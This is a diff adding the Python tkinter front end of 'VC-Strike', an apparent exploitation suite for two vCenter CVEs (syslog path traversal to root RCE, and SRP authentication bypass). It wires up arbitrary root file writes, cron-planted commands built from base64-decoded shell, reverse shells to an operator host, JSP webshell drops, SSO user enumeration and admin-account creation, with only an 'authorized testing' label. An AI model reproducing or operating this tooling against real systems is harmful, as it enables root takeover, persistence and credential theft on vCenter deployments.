@@ -1,0 +1,1287 @@
+"""VC-Strike GUI —— tkinter 深色简洁界面，与 CLI 功能等价。
+
+页签：①目标与指纹 ②CVE-2026-59310 ③CVE-2026-59309 ④C2/反弹Shell
+      ⑤后渗透 ⑥清理中心 ⑦检测与加固
+"""
+import base64
+import csv
+import queue
+import threading
+import time
+
+try:
+    import tkinter as tk
+    from tkinter import ttk, filedialog, messagebox
+except ImportError:      # CI / 无显示环境
+    tk = None
+
+from . import __version__
+from .util import rand_name
+from .recon import probe_target
+from .srp59309 import srp_bypass_bind
+from .berldap import (connect_ldap, root_dse_probe, op_search, op_add,
+                      op_modify, collect_search, parse_ldap_result)
+from .syslog59310 import (build_rfc5424, check_write, write_file, plant_cron,
+                          rce_readback, drop_webshell, traversal_app,
+                          traversal_host, plant_revshell)
+from .postex import POSTEX_ACTIONS
+from .data import DETECTION_TEXT
+from .c2 import SessionManager
+
+COLORS = {
+    "bg": "#17181c", "panel": "#1f2127", "panel2": "#24262e",
+    "input": "#2a2d36", "fg": "#d7dae0", "muted": "#8b909a",
+    "accent": "#3d7eff", "ok": "#37c871", "warn": "#e6b450",
+    "err": "#e0564b", "term": "#0c0d10", "termfg": "#7ee787",
+}
+
+
+class ToolApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("VC-Strike — vCenter CVE-2026-59309/59310 授权测试套件 v%s"
+                        % __version__)
+        self.root.geometry("1200x800")
+        self.root.minsize(1020, 680)
+        self.logq = queue.Queue()
+        self.actions = []            # 会话动作记录（清理中心数据源）
+        self.srp_conns = {}          # host -> LDAPConn（已绕过）
+        self.creds = {}              # 凭据收集
+        self.stop_flag = threading.Event()
+        self.c2m = SessionManager(log=self.log)
+        self.c2m.on_new_session = self._on_new_session
+        self.cur_sess = None
+        self._build_style()
+        self._build_ui()
+        self.root.after(120, self._poll_log)
+        self.root.after(1000, self._poll_sessions)
+        self.log("[i] 就绪。本工具仅用于授权渗透测试 / 漏洞验证。", "i")
+        self.log("[i] 推荐流程：①指纹 → ②/③利用 → ⑤后渗透 → ⑥清理。", "m")
+
+    # ---------------- 样式 ----------------
+    def _build_style(self):
+        st = ttk.Style(self.root)
+        try:
+            st.theme_use("clam")
+        except Exception:
+            pass
+        C = COLORS
+        st.configure(".", background=C["bg"], foreground=C["fg"],
+                     fieldbackground=C["input"], font=("Microsoft YaHei UI", 9))
+        st.configure("TNotebook", background=C["bg"], borderwidth=0,
+                     tabmargins=[8, 6, 8, 0])
+        st.configure("TNotebook.Tab", background=C["panel"], foreground=C["muted"],
+                     padding=(14, 7), font=("Microsoft YaHei UI", 9))
+        st.map("TNotebook.Tab",
+               background=[("selected", C["panel2"])],
+               foreground=[("selected", C["accent"])])
+        st.configure("TFrame", background=C["bg"])
+        st.configure("TLabel", background=C["bg"], foreground=C["fg"])
+        st.configure("Muted.TLabel", background=C["bg"], foreground=C["muted"])
+        st.configure("TLabelframe", background=C["bg"], bordercolor=C["panel2"],
+                     relief="solid", borderwidth=1)
+        st.configure("TLabelframe.Label", background=C["bg"], foreground=C["accent"],
+                     font=("Microsoft YaHei UI", 9, "bold"))
+        st.configure("H1.TLabel", background=C["bg"], foreground=C["fg"],
+                     font=("Microsoft YaHei UI", 12, "bold"))
+        st.configure("TButton", background=C["panel2"], foreground=C["fg"],
+                     borderwidth=0, padding=(10, 5))
+        st.map("TButton", background=[("active", C["accent"])],
+               foreground=[("active", "#ffffff")])
+        st.configure("Acc.TButton", background=C["accent"], foreground="#ffffff")
+        st.map("Acc.TButton", background=[("active", "#5c9bff")])
+        st.configure("Danger.TButton", background="#8c3a32", foreground="#ffffff")
+        st.map("Danger.TButton", background=[("active", C["err"])])
+        st.configure("TEntry", fieldbackground=C["input"], foreground=C["fg"],
+                     insertcolor=C["fg"])
+        st.configure("TCombobox", fieldbackground=C["input"], background=C["panel2"],
+                     foreground=C["fg"], arrowcolor=C["fg"])
+        st.map("TCombobox", fieldbackground=[("readonly", C["input"])])
+        self.root.option_add("*TCombobox*Listbox.background", C["panel2"])
+        self.root.option_add("*TCombobox*Listbox.foreground", C["fg"])
+        self.root.option_add("*TCombobox*Listbox.selectBackground", C["accent"])
+        st.configure("Treeview", background=C["panel"], fieldbackground=C["panel"],
+                     foreground=C["fg"], rowheight=24, borderwidth=0)
+        st.configure("Treeview.Heading", background=C["panel2"],
+                     foreground=C["muted"], relief="flat",
+                     font=("Microsoft YaHei UI", 9))
+        st.map("Treeview", background=[("selected", C["accent"])],
+               foreground=[("selected", "#ffffff")])
+        st.configure("TScrollbar", background=C["panel2"], troughcolor=C["bg"],
+                     arrowcolor=C["muted"], borderwidth=0)
+
+    # ---------------- 骨架 ----------------
+    def _build_ui(self):
+        C = COLORS
+        head = ttk.Frame(self.root, padding=(14, 8))
+        head.pack(fill="x")
+        ttk.Label(head, text="VC-Strike", style="H1.TLabel").pack(side="left")
+        ttk.Label(head, text="  CVE-2026-59310 (syslog→root RCE) + "
+                             "CVE-2026-59309 (SRP 认证绕过)",
+                  style="Muted.TLabel").pack(side="left", padx=6)
+        self.status_var = tk.StringVar(value="● 就绪")
+        ttk.Label(head, textvariable=self.status_var,
+                  style="Muted.TLabel").pack(side="right")
+        ttk.Label(head, text="仅限授权测试 ·", style="Muted.TLabel").pack(side="right")
+
+        nb = ttk.Notebook(self.root)
+        nb.pack(fill="both", expand=True, padx=10, pady=(8, 0))
+        tabs = []
+        for _ in range(7):
+            tabs.append(ttk.Frame(nb))
+        self.tab_target, self.tab_59310, self.tab_59309, self.tab_shell, \
+            self.tab_postex, self.tab_clean, self.tab_detect = tabs
+        for w, name in zip(tabs, (" ① 目标与指纹 ", " ② CVE-2026-59310 利用 ",
+                                  " ③ CVE-2026-59309 利用 ", " ④ C2 / 反弹 Shell ",
+                                  " ⑤ 后渗透 ", " ⑥ 清理中心 ", " ⑦ 检测与加固 ")):
+            nb.add(w, text=name)
+
+        self.cur_target = tk.StringVar()
+        self.http_proxy = tk.StringVar()
+
+        self._build_tab_target()
+        self._build_tab_59310()
+        self._build_tab_59309()
+        self._build_tab_shell()
+        self._build_tab_postex()
+        self._build_tab_clean()
+        self._build_tab_detect()
+
+        logf = ttk.Frame(self.root)
+        logf.pack(fill="both", side="bottom", padx=10, pady=(6, 8))
+        bar = ttk.Frame(logf)
+        bar.pack(fill="x")
+        ttk.Label(bar, text="日志", style="Muted.TLabel").pack(side="left")
+        ttk.Button(bar, text="清空", command=self._log_clear, width=8).pack(side="right")
+        ttk.Button(bar, text="保存", command=self._log_save, width=8).pack(side="right", padx=4)
+        self.log_txt = tk.Text(logf, height=8, bg=C["term"], fg=C["fg"],
+                               insertbackground=C["fg"], relief="flat",
+                               font=("Consolas", 9), state="disabled", wrap="none")
+        self.log_txt.pack(fill="both", expand=True)
+        for k, c in (("i", C["fg"]), ("m", C["muted"]), ("+", C["ok"]),
+                     ("w", C["warn"]), ("!", C["err"]), ("d", "#5a9d5f")):
+            self.log_txt.tag_configure(k, foreground=c)
+
+    def _poll_log(self):
+        try:
+            while True:
+                lvl, msg = self.logq.get_nowait()
+                ts = time.strftime("%H:%M:%S")
+                self.log_txt.configure(state="normal")
+                self.log_txt.insert("end", "[%s] %s\n" % (ts, msg), lvl)
+                self.log_txt.see("end")
+                self.log_txt.configure(state="disabled")
+        except queue.Empty:
+            pass
+        self.root.after(120, self._poll_log)
+
+    def log(self, msg, level="i"):
+        self.logq.put((level, msg))
+
+    def _log_clear(self):
+        self.log_txt.configure(state="normal")
+        self.log_txt.delete("1.0", "end")
+        self.log_txt.configure(state="disabled")
+
+    def _log_save(self):
+        f = filedialog.asksaveasfilename(
+            defaultextension=".log",
+            initialfile="vc-strike-%s.log" % time.strftime("%Y%m%d-%H%M%S"))
+        if not f:
+            return
+        with open(f, "w", encoding="utf-8") as fp:
+            fp.write(self.log_txt.get("1.0", "end"))
+        self.log("[+] 日志已保存: %s" % f, "+")
+
+    # ---------------- 公共 ----------------
+    def _target_bar(self, parent, row=0):
+        f = ttk.Frame(parent)
+        f.grid(row=row, column=0, columnspan=12, sticky="ew", pady=(0, 4))
+        ttk.Label(f, text="目标:", style="Muted.TLabel").pack(side="left")
+        tv = tk.StringVar(value=self.cur_target.get())
+        ttk.Entry(f, textvariable=tv, width=26).pack(side="left", padx=4)
+        ttk.Button(f, text="取当前目标", width=10,
+                   command=lambda: tv.set(self.cur_target.get())).pack(side="left", padx=2)
+        return f, tv
+
+    def _busy(self, text):
+        self.status_var.set("● " + text)
+
+    def _idle(self):
+        self.status_var.set("● 就绪")
+
+    def run_bg(self, fn, name="任务"):
+        def wrap():
+            self._busy(name + "执行中…")
+            try:
+                fn()
+            except Exception as e:
+                self.log("[!] %s 异常: %r" % (name, e), "!")
+                import traceback
+                traceback.print_exc()
+            finally:
+                self._idle()
+        threading.Thread(target=wrap, daemon=True).start()
+
+    def record(self, typ, target, detail, cleanup):
+        self.actions.append({"time": time.strftime("%m-%d %H:%M:%S"), "type": typ,
+                             "target": target, "detail": detail, "cleanup": cleanup})
+        self.log("[记录] %s → %s（清理项已登记）" % (typ, detail), "d")
+
+    # ================= Tab1 目标与指纹 =================
+    def _build_tab_target(self):
+        f = self.tab_target
+        f.columnconfigure(0, weight=1)
+        f.rowconfigure(1, weight=1)
+
+        top = ttk.Frame(f)
+        top.grid(row=0, column=0, sticky="ew", pady=4)
+        ttk.Label(top, text="目标 (host 或 host:port):").pack(side="left")
+        self.tgt_input = tk.StringVar()
+        ttk.Entry(top, textvariable=self.tgt_input, width=28).pack(side="left", padx=6)
+        ttk.Button(top, text="添加", command=self._tgt_add).pack(side="left")
+        ttk.Button(top, text="导入列表…", command=self._tgt_import).pack(side="left", padx=4)
+        ttk.Button(top, text="移除选中", command=self._tgt_del).pack(side="left")
+        ttk.Button(top, text="设为当前目标", command=self._tgt_setcur).pack(side="left", padx=4)
+        ttk.Button(top, text="导出 CSV", command=self._scan_export).pack(side="right", padx=4)
+        ttk.Button(top, text="批量指纹", style="Acc.TButton",
+                   command=self._scan_all).pack(side="right")
+        ttk.Label(top, text="HTTP代理:", style="Muted.TLabel").pack(side="right", padx=(10, 2))
+        ttk.Entry(top, textvariable=self.http_proxy, width=18).pack(side="right")
+
+        cols = ("host", "443", "5480", "514tcp", "1514", "389", "636", "2020",
+                "api", "sasl", "namingContext", "结论")
+        wrapf = ttk.Frame(f)
+        wrapf.grid(row=1, column=0, sticky="nsew", pady=4)
+        self.scan_tree = ttk.Treeview(wrapf, columns=cols, show="headings",
+                                      selectmode="extended")
+        widths = (150, 40, 46, 48, 40, 40, 40, 40, 70, 150, 200, 260)
+        for c, w in zip(cols, widths):
+            self.scan_tree.heading(c, text=c)
+            self.scan_tree.column(c, width=w, anchor="w")
+        sb = ttk.Scrollbar(wrapf, command=self.scan_tree.yview)
+        self.scan_tree.pack(side="left", fill="both", expand=True)
+        sb.pack(side="left", fill="y")
+        self.scan_tree.configure(yscrollcommand=sb.set)
+        self.scan_tree.bind("<Double-1>", lambda e: self._tgt_setcur())
+        self.scan_results = {}
+
+        ttk.Label(f, text="批量指纹 = 仅探测，不利用。双击行 → 设为全局当前目标。"
+                          "UDP/514 无法被动探测，59310 的确认请用 ② 页“非破坏写入验证”。",
+                  style="Muted.TLabel").grid(row=2, column=0, sticky="w")
+
+    def _tgt_add(self):
+        h = self.tgt_input.get().strip()
+        if not h:
+            return
+        existing = {self.scan_tree.item(i, "values")[0].split(":")[0]
+                    for i in self.scan_tree.get_children()}
+        for part in h.replace(";", ",").split(","):
+            part = part.strip()
+            if part and part.split(":")[0] not in existing:
+                self.scan_tree.insert("", "end",
+                                      values=(part, "", "", "", "", "", "", "", "", "", "", ""))
+
+        self.tgt_input.set("")
+
+    def _tgt_import(self):
+        fn = filedialog.askopenfilename(filetypes=[("文本", "*.txt"), ("所有", "*.*")])
+        if not fn:
+            return
+        with open(fn, encoding="utf-8", errors="replace") as fp:
+            for line in fp:
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    self.tgt_input.set(line)
+                    self._tgt_add()
+        self.log("[+] 目标列表已导入", "+")
+
+    def _tgt_del(self):
+        for s in self.scan_tree.selection():
+            self.scan_tree.delete(s)
+
+    def _tgt_setcur(self):
+        sel = self.scan_tree.selection()
+        if not sel:
+            return
+        host = self.scan_tree.item(sel[0], "values")[0].split(":")[0]
+        self.cur_target.set(host)
+        self.log("[+] 当前目标 → %s" % host, "+")
+
+    def _scan_all(self):
+        hosts = [self.scan_tree.item(i, "values")[0].split(":")[0]
+                 for i in self.scan_tree.get_children()]
+        if not hosts:
+            messagebox.showinfo("提示", "先添加目标")
+            return
+        proxy = self.http_proxy.get().strip() or None
+
+        def work():
+            self.log("[*] 批量指纹开始：%d 个目标（仅探测）" % len(hosts), "i")
+            for h in hosts:
+                try:
+                    r = probe_target(h, proxy=proxy, log=self.log)
+                except Exception as e:
+                    self.log("[!] %s 探测异常: %r" % (h, e), "!")
+                    continue
+                self.scan_results[h] = r
+                vals = (r["host"], "●" if r["443"] else "", "●" if r["5480"] else "",
+                        "●" if r["514tcp"] else "", "●" if r["1514"] else "",
+                        "●" if r["389"] else "", "●" if r["636"] else "",
+                        "●" if r["2020"] else "",
+                        r["api"] or "", r["mechs"] or "", r["nc"] or "", r["conclusion"])
+                for iid in self.scan_tree.get_children():
+                    if self.scan_tree.item(iid, "values")[0].split(":")[0] == h:
+                        self.scan_tree.item(iid, values=vals)
+                        break
+                self.log("[+] %s → %s" % (h, r["conclusion"]), "+")
+            self.log("[*] 批量指纹完成", "+")
+        self.run_bg(work, "批量指纹")
+
+    def _scan_export(self):
+        if not self.scan_results:
+            messagebox.showinfo("提示", "无结果可导出")
+            return
+        f = filedialog.asksaveasfilename(
+            defaultextension=".csv",
+            initialfile="vc-fingerprint-%s.csv" % time.strftime("%Y%m%d-%H%M%S"))
+        if not f:
+            return
+        cols = ("host", "443", "5480", "514tcp", "1514", "389", "636", "2020",
+                "api", "mechs", "nc", "conclusion")
+        with open(f, "w", newline="", encoding="utf-8-sig") as fp:
+            w = csv.writer(fp)
+            w.writerow(cols)
+            for h, r in self.scan_results.items():
+                w.writerow([h] + [("●" if r.get(c) else "") if isinstance(r.get(c), bool)
+                                  else (r.get(c) or "") for c in cols[1:]])
+        self.log("[+] 指纹结果已导出: %s" % f, "+")
+
+    # ================= Tab2 CVE-2026-59310 =================
+    def _build_tab_59310(self):
+        f = self.tab_59310
+        f.columnconfigure(0, weight=1)
+        f.columnconfigure(1, weight=1)
+        f.rowconfigure(1, weight=1)
+        _bar, tv = self._target_bar(f)
+        self.v59310_host = tv
+
+        left = ttk.Frame(f)
+        left.grid(row=1, column=0, sticky="nsew", padx=(0, 6))
+        right = ttk.Frame(f)
+        right.grid(row=1, column=1, sticky="nsew", padx=(6, 0))
+
+        pf = ttk.LabelFrame(left, text="参数")
+        pf.pack(fill="x", pady=4)
+        self.v510_port = tk.StringVar(value="514")
+        self.v510_proto = tk.StringVar(value="UDP")
+        self.v510_name = tk.StringVar(value=rand_name())
+        self.v510_vport = tk.StringVar(value="5480")
+        self.v510_b64 = tk.BooleanVar(value=True)
+        ttk.Label(pf, text="syslog端口:").grid(row=0, column=0, sticky="w", padx=4, pady=2)
+        ttk.Entry(pf, textvariable=self.v510_port, width=7).grid(row=0, column=1)
+        ttk.Label(pf, text="协议:").grid(row=0, column=2, padx=(10, 2))
+        ttk.Combobox(pf, textvariable=self.v510_proto, values=["UDP", "TCP", "TLS"],
+                     width=5, state="readonly").grid(row=0, column=3)
+        ttk.Label(pf, text="标识:").grid(row=0, column=4, padx=(10, 2))
+        ttk.Entry(pf, textvariable=self.v510_name, width=9).grid(row=0, column=5)
+        ttk.Button(pf, text="↻", width=3,
+                   command=lambda: self.v510_name.set(rand_name())).grid(row=0, column=6)
+        ttk.Label(pf, text="VAMI端口(回显):", style="Muted.TLabel").grid(
+            row=1, column=0, sticky="w", padx=4)
+        ttk.Entry(pf, textvariable=self.v510_vport, width=7).grid(row=1, column=1)
+        ttk.Checkbutton(pf, text="base64 封装命令(规避引号问题)",
+                        variable=self.v510_b64).grid(row=1, column=2, columnspan=5,
+                                                     sticky="w")
+
+        bf = ttk.LabelFrame(left, text="探测与验证")
+        bf.pack(fill="x", pady=4)
+        ttk.Button(bf, text="非破坏写入验证（--check，写 /tmp 标记）",
+                   style="Acc.TButton",
+                   command=self._b310_check).pack(fill="x", pady=2, padx=4)
+        ttk.Label(bf, text="发送后需在目标上 ls 确认（UDP 无回包，写入验证即最强探测）。",
+                  style="Muted.TLabel").pack(anchor="w", padx=6)
+
+        wf = ttk.LabelFrame(left, text="任意文件写 (root)")
+        wf.pack(fill="both", expand=True, pady=4)
+        ttk.Label(wf, text="目标路径(自动追加 -syslog.log):").grid(
+            row=0, column=0, columnspan=2, sticky="w", padx=4)
+        self.v510_wpath = tk.StringVar(value="/opt/vmware/share/htdocs/pwned")
+        ttk.Entry(wf, textvariable=self.v510_wpath).grid(row=1, column=0, columnspan=2,
+                                                         sticky="ew", padx=4)
+        ttk.Label(wf, text="向量: APP-NAME(默认) / HOSTNAME(mobeta)").grid(
+            row=2, column=0, columnspan=2, sticky="w", padx=4)
+        self.v510_vec = tk.StringVar(value="app")
+        ttk.Combobox(wf, textvariable=self.v510_vec, values=["app", "host"],
+                     width=6, state="readonly").grid(row=3, column=0, sticky="w", padx=4)
+        ttk.Label(wf, text="内容:", style="Muted.TLabel").grid(
+            row=4, column=0, columnspan=2, sticky="w", padx=4)
+        self.v510_wtext = tk.Text(wf, height=4, bg=COLORS["term"], fg=COLORS["fg"],
+                                  insertbackground=COLORS["fg"], relief="flat",
+                                  font=("Consolas", 9))
+        self.v510_wtext.grid(row=5, column=0, columnspan=2, sticky="ew", padx=4, pady=2)
+        self.v510_wtext.insert("1.0", "pwned-by-authorized-test")
+        ttk.Button(wf, text="预览报文", command=self._b310_preview).grid(
+            row=6, column=0, sticky="w", padx=4, pady=2)
+        ttk.Button(wf, text="发送写入", style="Acc.TButton",
+                   command=self._b310_write).grid(row=6, column=1, sticky="e",
+                                                  padx=4, pady=2)
+        wf.columnconfigure(0, weight=1)
+
+        rf = ttk.LabelFrame(right, text="RCE — root 命令执行")
+        rf.pack(fill="x", pady=4)
+        self.v510_cmd = tk.StringVar(value="id; hostname; cat /etc/vmware-release")
+        ttk.Entry(rf, textvariable=self.v510_cmd).pack(fill="x", padx=4, pady=2)
+        bb = ttk.Frame(rf)
+        bb.pack(fill="x", padx=4, pady=2)
+        ttk.Button(bb, text="执行并取回输出（VAMI 回显）", style="Acc.TButton",
+                   command=self._b310_rce_readback).pack(side="left")
+        ttk.Button(bb, text="仅植入（输出落目标 /tmp）",
+                   command=self._b310_rce_plain).pack(side="left", padx=6)
+        self.v510_out = tk.Text(right, height=8, bg=COLORS["term"], fg=COLORS["termfg"],
+                                relief="flat", font=("Consolas", 9))
+        self.v510_out.pack(fill="both", expand=True, pady=4)
+
+        sf = ttk.LabelFrame(right, text="反弹 Shell / C2")
+        sf.pack(fill="x", pady=4)
+        ttk.Label(sf, text="LHost:").grid(row=0, column=0, padx=4)
+        self.v510_lhost = tk.StringVar()
+        ttk.Entry(sf, textvariable=self.v510_lhost, width=15).grid(row=0, column=1)
+        ttk.Label(sf, text="LPort:").grid(row=0, column=2, padx=(8, 2))
+        self.v510_lport = tk.StringVar(value="4444")
+        ttk.Entry(sf, textvariable=self.v510_lport, width=7).grid(row=0, column=3)
+        ttk.Label(sf, text="方式:").grid(row=0, column=4, padx=(8, 2))
+        self.v510_rmethod = tk.StringVar(value="bash")
+        ttk.Combobox(sf, textvariable=self.v510_rmethod, values=["bash", "python"],
+                     width=7, state="readonly").grid(row=0, column=5)
+        ttk.Button(sf, text="植入 + 去 ④ 页监听", style="Acc.TButton",
+                   command=self._b310_revshell).grid(row=1, column=0, columnspan=3,
+                                                     sticky="w", padx=4, pady=4)
+
+        jf = ttk.LabelFrame(right, text="JSP WebShell 植入（perfcharts statsreport）")
+        jf.pack(fill="x", pady=4)
+        jbar = ttk.Frame(jf)
+        jbar.pack(fill="x", padx=4, pady=2)
+        ttk.Label(jbar, text="名称:").pack(side="left")
+        self.v510_wsname = tk.StringVar(value=rand_name())
+        ttk.Entry(jbar, textvariable=self.v510_wsname, width=10).pack(side="left", padx=4)
+        ttk.Button(jbar, text="↻", width=3,
+                   command=lambda: self.v510_wsname.set(rand_name())).pack(side="left")
+        ttk.Button(jbar, text="植入 WebShell", style="Acc.TButton",
+                   command=self._b310_webshell).pack(side="left", padx=8)
+        ttk.Label(jf, text="访问: https://<目标>/statsreport/<名称>.jsp?c=id&d=/tmp"
+                          "（如需认证，配合 ③ 页账户或已提取凭据）",
+                  style="Muted.TLabel").pack(anchor="w", padx=6, pady=2)
+
+    def _510_net(self):
+        host = self.v59310_host.get().strip().split(":")[0]
+        port = int(self.v510_port.get() or 514)
+        proto = self.v510_proto.get()
+        return host, port, proto in ("TCP", "TLS"), proto == "TLS"
+
+    def _b310_check(self):
+        host, port, tcp, tls = self._510_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        name = self.v510_name.get().strip() or rand_name()
+
+        def work():
+            self.log("[*] CVE-2026-59310 非破坏验证 → %s:%d/%s" %
+                     (host, port, self.v510_proto.get()), "i")
+            path, pkt = check_write(host, port, name, tcp=tcp, tls=tls)
+            self.log("[d] %r" % pkt, "d")
+            self.log("[+] 已发送。预期目标生成 root 文件: %s" % path, "+")
+            self.log("[i] 目标上验证: ls -la %s" % path, "m")
+            self.record("59310-写入验证", host, path, "rm -f %s" % path)
+        self.run_bg(work, "写入验证")
+
+    def _b310_preview(self):
+        dest = self.v510_wpath.get().strip()
+        content = self.v510_wtext.get("1.0", "end").strip()
+        vec = self.v510_vec.get()
+        app = traversal_app(dest) if vec == "app" else "probe"
+        hostn = "h" if vec == "app" else traversal_host(dest)
+        pkt = build_rfc5424(hostn, app, "\n" + content + "\n#")
+        self.log("[预览] %r" % pkt, "d")
+        messagebox.showinfo("报文预览", pkt.decode("latin-1", "replace"))
+
+    def _b310_write(self):
+        host, port, tcp, tls = self._510_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        dest = self.v510_wpath.get().strip()
+        content = self.v510_wtext.get("1.0", "end").strip()
+
+        def work():
+            written, pkt = write_file(host, port, dest, content,
+                                      vector=self.v510_vec.get(), tcp=tcp, tls=tls)
+            self.log("[+] 已发送写入 → 预期文件 %s" % written, "+")
+            self.log("[d] %r" % pkt, "d")
+            self.record("59310-任意写", host, written, "rm -f %s" % written)
+        self.run_bg(work, "任意写")
+
+    def _b310_rce_readback(self):
+        host, port, tcp, tls = self._510_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        cmd = self.v510_cmd.get()
+        if "\n" in cmd:
+            messagebox.showwarning("提示", "命令不能包含换行")
+            return
+        tag = rand_name(6)
+        vport = int(self.v510_vport.get() or 5480)
+        proxy = self.http_proxy.get().strip() or None
+
+        def work():
+            self.log("[*] RCE(回显) → %s : %s" % (host, cmd), "i")
+            ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
+                                    vami_port=vport, proxy=proxy,
+                                    use_b64=self.v510_b64.get(),
+                                    poll_cb=lambda s: self.log(s, "m"),
+                                    stop_flag=self.stop_flag)
+            if ok:
+                self.log("[+] 命令输出已取回（%d 字节）" % len(text), "+")
+                self.v510_out.delete("1.0", "end")
+                self.v510_out.insert("1.0", text)
+                self.record("59310-RCE", host, cmd[:80],
+                            "rm -f /opt/vmware/share/htdocs/r%s.txt "
+                            "/etc/cron.d/cve59310%s*" % (tag, tag))
+            else:
+                self.log("[!] %s" % text, "!")
+        self.run_bg(work, "RCE回显")
+
+    def _b310_rce_plain(self):
+        host, port, tcp, tls = self._510_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        cmd = self.v510_cmd.get()
+        if "\n" in cmd:
+            messagebox.showwarning("提示", "命令不能包含换行")
+            return
+        name = self.v510_name.get().strip() or rand_name()
+        out = "/tmp/cve59310_%s.txt" % name
+
+        def work():
+            if self.v510_b64.get():
+                b64 = base64.b64encode(cmd.encode()).decode()
+                body = "/bin/sh -c 'echo %s | base64 -d | /bin/sh > %s 2>&1'" % (b64, out)
+            else:
+                body = "/bin/sh -c '{ %s; } > %s 2>&1'" % (
+                    cmd.replace("'", "'\\''"), out)
+            planted, _ = plant_cron(host, port, body, name, tcp=tcp, tls=tls)
+            self.log("[+] 已植入 %s（crond 约 60s 内以 root 执行）" % planted, "+")
+            self.log("[i] 目标上读取: cat %s" % out, "m")
+            self.record("59310-RCE落盘", host, out,
+                        "rm -f %s /etc/cron.d/cve59310%s*" % (out, name))
+        self.run_bg(work, "RCE落盘")
+
+    def _b310_revshell(self):
+        host, port, tcp, tls = self._510_net()
+        lhost = self.v510_lhost.get().strip()
+        lport = int(self.v510_lport.get() or 4444)
+        method = self.v510_rmethod.get()
+        if not host or not lhost:
+            messagebox.showwarning("提示", "需要目标与 LHost")
+            return
+
+        def work():
+            planted, _ = plant_revshell(host, port, lhost, lport, method,
+                                        tcp=tcp, tls=tls)
+            self.log("[+] 已植入反弹 %s:%d → %s" % (lhost, lport, planted), "+")
+            self.record("59310-反弹植入", host, "%s:%d" % (lhost, lport),
+                        "rm -f /etc/cron.d/cve59310*" )
+            self.root.after(0, lambda: self._c2_add_listener(lport))
+            self.log("[i] 已在 ④ 页启动监听 %d，等待 crond 触发回连（约 60s）" % lport, "m")
+        self.run_bg(work, "反弹植入")
+
+    def _b310_webshell(self):
+        host, port, tcp, tls = self._510_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        name = self.v510_wsname.get().strip() or rand_name()
+
+        def work():
+            written, planted, urls = drop_webshell(host, port, name, tcp=tcp, tls=tls)
+            self.log("[+] ① 写入 %s" % written, "+")
+            self.log("[+] ② cron 落地 %s" % planted, "+")
+            for u in urls:
+                self.log("[+] 访问: %s" % u, "+")
+            self.log("[i] 等待 crond 执行后生效；statsreport 可能要求认证", "m")
+            self.record("59310-WebShell", host, urls[0],
+                        "rm -f /usr/lib/vmware-perfcharts/tc-instance/webapps/"
+                        "statsreport/%s.jsp /usr/lib/vmware-perfcharts/webapps/"
+                        "statsreport/%s.jsp /tmp/ws%s-syslog.log" % (name, name, name))
+        self.run_bg(work, "WebShell")
+
+    # ================= Tab3 CVE-2026-59309 =================
+    def _build_tab_59309(self):
+        f = self.tab_59309
+        f.columnconfigure(0, weight=1)
+        f.columnconfigure(1, weight=1)
+        f.rowconfigure(1, weight=1)
+        _bar, tv = self._target_bar(f)
+        self.v590_host = tv
+
+        left = ttk.Frame(f)
+        left.grid(row=1, column=0, sticky="nsew", padx=(0, 6))
+        right = ttk.Frame(f)
+        right.grid(row=1, column=1, sticky="nsew", padx=(6, 0))
+
+        pf = ttk.LabelFrame(left, text="参数")
+        pf.pack(fill="x", pady=4)
+        self.v590_port = tk.StringVar(value="389")
+        self.v590_tls = tk.BooleanVar(value=False)
+        self.v590_policy = tk.StringVar(value="auto")
+        ttk.Label(pf, text="端口:").grid(row=0, column=0, padx=4)
+        ttk.Combobox(pf, textvariable=self.v590_port, values=["389", "636", "2020"],
+                     width=6, state="readonly").grid(row=0, column=1)
+        ttk.Checkbutton(pf, text="TLS(636 勾选)",
+                        variable=self.v590_tls).grid(row=0, column=2, columnspan=2)
+        ttk.Label(pf, text="安全层:").grid(row=0, column=4, padx=(10, 2))
+        ttk.Combobox(pf, textvariable=self.v590_policy, values=["auto", "full", "plain"],
+                     width=6, state="readonly").grid(row=0, column=5, sticky="w")
+        ttk.Label(pf, text="身份(须存在):").grid(row=1, column=0, padx=4, pady=2)
+        self.v590_ident = tk.StringVar(value="administrator@vsphere.local")
+        ttk.Entry(pf, textvariable=self.v590_ident).grid(row=1, column=1, columnspan=5,
+                                                         sticky="ew")
+
+        bf = ttk.LabelFrame(left, text="探测与绕过")
+        bf.pack(fill="x", pady=4)
+        ttk.Button(bf, text="SRP 机制探测（匿名 rootDSE，无利用）",
+                   command=self._b309_probe).pack(fill="x", padx=4, pady=2)
+        ttk.Button(bf, text="执行认证绕过（A=N → K=SHA1(\"\") → 伪造 M1）",
+                   style="Acc.TButton",
+                   command=self._b309_bypass).pack(fill="x", padx=4, pady=2)
+        self.v590_info = tk.Text(left, height=6, bg=COLORS["term"], fg=COLORS["fg"],
+                                 relief="flat", font=("Consolas", 9))
+        self.v590_info.pack(fill="x", pady=4)
+
+        lf = ttk.LabelFrame(left, text="SSO 目录信息收集")
+        lf.pack(fill="both", expand=True, pady=4)
+        ttk.Button(lf, text="枚举用户 (cn=Users)",
+                   command=self._b309_users).pack(fill="x", padx=4, pady=2)
+        ttk.Button(lf, text="查看管理员组成员",
+                   command=self._b309_admins).pack(fill="x", padx=4, pady=2)
+        wrapf = ttk.Frame(lf)
+        wrapf.pack(fill="both", expand=True, padx=4, pady=2)
+        self.v590_tree = ttk.Treeview(wrapf, columns=("attrs",), show="tree headings")
+        self.v590_tree.heading("#0", text="DN")
+        self.v590_tree.heading("attrs", text="关键属性")
+        self.v590_tree.column("#0", width=280)
+        self.v590_tree.column("attrs", width=240)
+        sb = ttk.Scrollbar(wrapf, command=self.v590_tree.yview)
+        self.v590_tree.pack(side="left", fill="both", expand=True)
+        sb.pack(side="left", fill="y")
+        self.v590_tree.configure(yscrollcommand=sb.set)
+
+        af = ttk.LabelFrame(right, text="账户操作（授权测试）")
+        af.pack(fill="x", pady=4)
+        ttk.Label(af, text="新建管理员: 用户名").grid(row=0, column=0, padx=4)
+        self.v590_newuser = tk.StringVar(value="pentest_" + rand_name(4))
+        ttk.Entry(af, textvariable=self.v590_newuser, width=18).grid(row=0, column=1)
